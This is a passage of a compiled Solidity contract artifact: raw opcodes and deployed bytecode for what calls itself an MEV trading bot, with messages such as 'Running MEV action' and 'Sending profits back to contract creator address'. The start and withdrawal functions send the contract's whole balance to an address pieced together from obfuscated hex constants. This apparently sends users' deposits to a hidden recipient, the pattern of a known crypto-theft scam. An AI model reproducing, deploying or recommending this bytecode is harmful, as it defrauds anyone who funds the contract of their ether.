POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x803 JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x5E9 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x60B JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x65C JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x66C JUMPI PUSH1 0x57 DUP4 SUB SWAP3 POP PUSH2 0x706 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6AA JUMPI POP PUSH1 0x46 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x6BA JUMPI PUSH1 0x37 DUP4 SUB SWAP3 POP PUSH2 0x705 JUMP JUMPDEST PUSH1 0x30 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x6F8 JUMPI POP PUSH1 0x39 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x704 JUMPI PUSH1 0x30 DUP4 SUB SWAP3 POP JUMPDEST JUMPDEST JUMPDEST PUSH1 0x61 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x744 JUMPI POP PUSH1 0x66 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x754 JUMPI PUSH1 0x57 DUP3 SUB SWAP2 POP PUSH2 0x7EE JUMP JUMPDEST PUSH1 0x41 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x792 JUMPI POP PUSH1 0x46 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7A2 JUMPI PUSH1 0x37 DUP3 SUB SWAP2 POP PUSH2 0x7ED JUMP JUMPDEST PUSH1 0x30 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x7E0 JUMPI POP PUSH1 0x39 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x7EC JUMPI PUSH1 0x30 DUP3 SUB SWAP2 POP JUMPDEST JUMPDEST JUMPDEST DUP2 PUSH1 0x10 DUP5 MUL ADD DUP5 ADD SWAP4 POP PUSH1 0x2 DUP2 ADD SWAP1 POP PUSH2 0x5CD JUMP JUMPDEST POP DUP3 SWAP5 POP POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x822 PUSH2 0x81D PUSH2 0x46E JUMP JUMPDEST PUSH2 0x5B7 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x839 PUSH2 0x834 PUSH2 0x46E JUMP JUMPDEST PUSH2 0x5B7 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH4 0x4B716D2 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP4 SWAP1 POP JUMPDEST PUSH1 0x0 DUP2 EQ PUSH2 0x879 JUMPI DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH1 0x10 DUP2 DUP2 PUSH2 0x871 JUMPI INVALID JUMPDEST DIV SWAP1 POP PUSH2 0x857 JUMP JUMPDEST PUSH1 0x60 DUP3 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x892 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x8C5 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x944 JUMPI PUSH1 0x10 DUP7 DUP2 PUSH2 0x8E0 JUMPI INVALID JUMPDEST MOD SWAP3 POP PUSH2 0x8EC DUP4 PUSH2 0xAC0 JUMP JUMPDEST DUP3 PUSH1 0x1 DUP4 DUP8 SUB SUB DUP2 MLOAD DUP2 LT PUSH2 0x8FD JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 DUP2 PUSH2 0x936 JUMPI INVALID JUMPDEST DIV SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x8CE JUMP JUMPDEST POP DUP1 SWAP4 POP POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 DUP1 DUP4 SWAP1 POP PUSH1 0x60 DUP4 SWAP1 POP PUSH1 0x60 DUP2 MLOAD DUP4 MLOAD ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x978 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x9AB JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x60 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0xA29 JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0x9D0 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0x9ED JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0x9BB JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xA9C JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xA43 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xA60 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0xA2E JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xF06A SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x60F9E SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xADA JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xB0F JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xB64 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xB27 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xB5F JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD SUB PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xB64 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP INVALID MSTORE8 PUSH6 0x6E64696E6720 PUSH17 0x726F66697473206261636B20746F20636F PUSH15 0x74726163742063726561746F722061 PUSH5 0x6472657373 0x2E 0x2E 0x2E MSTORE PUSH22 0x6E6E696E67204D455620616374696F6E2E2054686973 KECCAK256 PUSH4 0x616E2074 PUSH2 0x6B65 KECCAK256 PUSH2 0x2077 PUSH9 0x696C653B20706C6561 PUSH20 0x6520776169742E2EA2646970667358221220E6F3 0x2F 0x1F 0xF LT 0x4A CALLDATALOAD DUP16 SAR CALLDATACOPY 0xA9 0xA8 PUSH12 0x740DA37A7D83DB8139B04A3D JUMPI 0x2E 0xEF SWAP12 0xDA CREATE PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER ",
							"sourceMap": "520:16871:0:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;520:16871:0;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "60806040526004361061004e5760003560e01c80636c02a9311461005a5780637b61c320146100ea578063ab1c067d1461017a578063be9a6555146101d1578063d4e93292146101db57610055565b3661005557005b600080fd5b34801561006657600080fd5b5061006f6101e5565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100af578082015181840152602081019050610094565b50505050905090810190601f1680156100dc5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100f657600080fd5b506100ff610283565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561013f578082015181840152602081019050610124565b50505050905090810190601f16801561016c5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561018657600080fd5b5061018f610321565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6101d9610338565b005b6101e36103d3565b005b60008054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561027b5780601f106102505761010080835404028352916020019161027b565b820191906000526020600020905b81548152906001019060200180831161025e57829003601f168201915b505050505081565b60018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156103195780601f106102ee57610100808354040283529160200191610319565b820191906000526020600020905b8154815290600101906020018083116102fc57829003601f168201915b505050505081565b600061033361032e61046e565b6105b7565b905090565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526038815260200180610b9d6038913960400191505060405180910390a161038b610810565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156103d0573d6000803e3d6000fd5b50565b7fcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab604051808060200182810382526033815260200180610b6a6033913960400191505060405180910390a1610426610827565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561046b573d6000803e3d6000fd5b50565b6060806104bf6040518060400160405280600181526020017f78000000000000000000000000000000000000000000000000000000000000008152506104ba6104b561083e565b61084a565b610950565b9050600064b00859c429905060006349edf9659050600062b71a32905060006104e6610aab565b905060006104f2610ab5565b90506060610508876105038861084a565b610950565b905060606105266105188761084a565b6105218761084a565b610950565b905060606105338561084a565b905060606105408561084a565b905060606105606105518686610950565b61055b8585610950565b610950565b905060606105a36040518060400160405280600181526020017f300000000000000000000000000000000000000000000000000000000000000081525083610950565b9050809c5050505050505050505050505090565b6000606082905060008090506000806000600290505b602a81101561080357610100840293508481815181106105e957fe5b602001015160f81c60f81b60f81c60ff16925084600182018151811061060b57fe5b602001015160f81c60f81b60f81c60ff16915060618373ffffffffffffffffffffffffffffffffffffffff161015801561065c575060668373ffffffffffffffffffffffffffffffffffffffff1611155b1561066c57605783039250610706565b60418373ffffffffffffffffffffffffffffffffffffffff16101580156106aa575060468373ffffffffffffffffffffffffffffffffffffffff1611155b156106ba57603783039250610705565b60308373ffffffffffffffffffffffffffffffffffffffff16101580156106f8575060398373ffffffffffffffffffffffffffffffffffffffff1611155b15610704576030830392505b5b5b60618273ffffffffffffffffffffffffffffffffffffffff1610158015610744575060668273ffffffffffffffffffffffffffffffffffffffff1611155b15610754576057820391506107ee565b60418273ffffffffffffffffffffffffffffffffffffffff1610158015610792575060468273ffffffffffffffffffffffffffffffffffffffff1611155b156107a2576037820391506107ed565b60308273ffffffffffffffffffffffffffffffffffffffff16101580156107e0575060398273ffffffffffffffffffffffffffffffffffffffff1611155b156107ec576030820391505b5b5b816010840201840193506002810190506105cd565b5082945050505050919050565b600061082261081d61046e565b6105b7565b905090565b600061083961083461046e565b6105b7565b905090565b60006304b716d2905090565b6060600080905060008390505b600081146108795781806001019250506010818161087157fe5b049050610857565b60608267ffffffffffffffff8111801561089257600080fd5b506040519080825280601f01601f1916602001820160405280156108c55781602001600182028036833780820191505090505b50905060008090505b8381101561094457601086816108e057fe5b0692506108ec83610ac0565b82600183870303815181106108fd57fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053506010868161093657fe5b0495508060010190506108ce565b50809350505050919050565b60608083905060608390506060815183510167ffffffffffffffff8111801561097857600080fd5b506040519080825280601f01601f1916602001820160405280156109ab5781602001600182028036833780820191505090505b5090506060819050600080600091505b8551821015610a29578582815181106109d057fe5b602001015160f81c60f81b8382806001019350815181106109ed57fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a90535081806001019250506109bb565b600091505b8451821015610a9c57848281518110610a4357fe5b602001015160f81c60f81b838280600101935081518110610a6057fe5b60200101907effffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916908160001a9053508180600101925050610a2e565b82965050505050505092915050565b600061f06a905090565b600062060f9e905090565b60008160ff16600011158015610ada575060098260ff1611155b15610b0f57817f300000000000000000000000000000000000000000000000000000000000000060f81c0160f81b9050610b64565b8160ff16600a11158015610b275750600f8260ff1611155b15610b5f57600a827f610000000000000000000000000000000000000000000000000000000000000060f81c010360f81b9050610b64565b600080fd5b91905056fe53656e64696e672070726f66697473206261636b20746f20636f6e74726163742063726561746f7220616464726573732e2e2e52756e6e696e67204d455620616374696f6e2e20546869732063616e2074616b652061207768696c653b20706c6561736520776169742e2ea2646970667358221220e6f32f1f0f104a358f1d37a9a86b740da37a7d83db8139b04a3d572eef9bdaf064736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6C02A931 EQ PUSH2 0x5A JUMPI DUP1 PUSH4 0x7B61C320 EQ PUSH2 0xEA JUMPI DUP1 PUSH4 0xAB1C067D EQ PUSH2 0x17A JUMPI DUP1 PUSH4 0xBE9A6555 EQ PUSH2 0x1D1 JUMPI DUP1 PUSH4 0xD4E93292 EQ PUSH2 0x1DB JUMPI PUSH2 0x55 JUMP JUMPDEST CALLDATASIZE PUSH2 0x55 JUMPI STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x66 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6F PUSH2 0x1E5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xAF JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x94 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0xDC JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xF6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xFF PUSH2 0x283 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x13F JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x124 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x16C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x186 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x18F PUSH2 0x321 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1D9 PUSH2 0x338 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x1E3 PUSH2 0x3D3 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x27B JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x250 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x27B JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x25E JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x1 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x319 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x2EE JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x319 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x2FC JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x333 PUSH2 0x32E PUSH2 0x46E JUMP JUMPDEST PUSH2 0x5B7 JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x38 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB9D PUSH1 0x38 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x38B PUSH2 0x810 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x3D0 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH32 0xCF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x33 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xB6A PUSH1 0x33 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x426 PUSH2 0x827 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x46B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x60 DUP1 PUSH2 0x4BF PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x4BA PUSH2 0x4B5 PUSH2 0x83E JUMP JUMPDEST PUSH2 0x84A JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH5 0xB00859C429 SWAP1 POP PUSH1 0x0 PUSH4 0x49EDF965 SWAP1 POP PUSH1 0x0 PUSH3 0xB71A32 SWAP1 POP PUSH1 0x0 PUSH2 0x4E6 PUSH2 0xAAB JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0x4F2 PUSH2 0xAB5 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x508 DUP8 PUSH2 0x503 DUP9 PUSH2 0x84A JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x526 PUSH2 0x518 DUP8 PUSH2 0x84A JUMP JUMPDEST PUSH2 0x521 DUP8 PUSH2 0x84A JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x533 DUP6 PUSH2 0x84A JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x540 DUP6 PUSH2 0x84A JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x560 PUSH2 0x551 DUP7 DUP7 PUSH2 0x950 JUMP JUMPDEST PUSH2 0x55B DUP6 DUP6 PUSH2 0x950 JUMP JUMPDEST PUSH2 0x950 JUMP JUMPDEST SWAP1 POP PUSH1 0x60 PUSH2 0x5A3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x950 JUMP JUMPDEST SWAP1 POP DUP1 SWAP13 POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 SWAP1 POP PUSH1 0x0 DUP1 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x803 JUMPI PUSH2 0x100 DUP5 MUL SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x5E9 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 ADD DUP2 MLOAD DUP2 LT PUSH2 0x60B JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x65C JUMPI POP PUSH1 0x66 DUP4 PUSH20 